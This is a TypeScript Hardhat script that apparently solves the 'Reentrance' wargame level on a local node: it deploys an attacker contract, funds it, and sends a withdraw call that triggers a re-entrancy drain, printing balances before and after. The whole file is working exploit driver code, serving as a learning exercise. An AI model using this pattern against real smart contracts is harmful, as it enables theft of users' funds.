import { ethers } from "hardhat";
import { BigNumber } from "ethers";
import { TransactionRequest } from "@ethersproject/providers";

//Fit player address chosen from hardhat node addresses and contract address (current lvl instance)
const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";
const CONTRACT_ADDRESS = "0x13F7816057De7256dAF5028EaF8E79775d3a27A3";

async function main() {
const signer = await ethers.getSigner(PLAYER_ADDRESS);
const contract = await ethers.getContractAt("Reentrance",CONTRACT_ADDRESS, signer);

const attackerContractFactory = await ethers.getContractFactory("ReentranceAttack", signer);
const attackerContract = await attackerContractFactory.deploy(contract.address);

//HACK STEPS 

// 1. Check contract balance
let balance = await ethers.provider.getBalance(contract.address);
console.log("Current contract balance(eth) is: ", balance.toString());

// 2. Call attacker contract to fund contract and the balances mapping. Check the result.
await attackerContract.fund({value: ethers.utils.parseEther("0.001")});
balance = await ethers.provider.getBalance(contract.address);
console.log("After donation, balance(eth) is: ", balance.toString());

let balanceAttacker = await contract.balanceOf(attackerContract.address);
console.log("Attacker balance (eth) is: ", balanceAttacker.toString());

// 3. Call attacker contract to withdraw and provoke re-entrancy attack. 
// Send enough gas to complete all calls between contracts.
let ABI = ["function withdraw()"];
let iface = new ethers.utils.Interface(ABI);
let calldata = iface.encodeFunctionData("withdraw", []);

const tx: TransactionRequest = {
    to: attackerContract.address,
    data: calldata,
    gasLimit: BigNumber.from('2000000')
}

await signer.sendTransaction(tx);


// 4. Check balance after re-entrancy attack
balance = await ethers.provider.getBalance(contract.address);
console.log("After re-entrancy, balance(eth) is: ", balance.toString());
balanceAttacker = await contract.balanceOf(attackerContract.address);
console.log("Attacker balance (eth) is: ", balanceAttacker.toString());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
